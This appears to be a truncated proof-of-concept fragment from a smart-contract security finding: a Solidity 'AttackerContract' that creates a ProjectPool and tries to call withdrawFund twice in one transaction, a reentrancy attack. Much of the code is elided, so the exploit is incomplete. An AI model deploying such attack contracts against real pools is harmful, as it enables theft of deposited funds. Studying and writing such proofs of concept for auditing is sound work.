...
contract AttackerContract {
    ...
    constructor(ProjectPoolFactory _factory) {
        factory = _factory;
        owner = msg.sender;
    }
    ...
    function createPool(
        ...
        address poolAddress = factory.getProjectPoolAddress(poolId);
        pool = ProjectPool(poolAddress);
    }
    ...
    function attackWithdraw() external {
        ...
        // Call withdraw the first time
        pool.withdrawFund(); 

        // Attempt to call it again within the same transaction
        if (inReentrancy) {
            pool.withdrawFund(); 
        }
    }
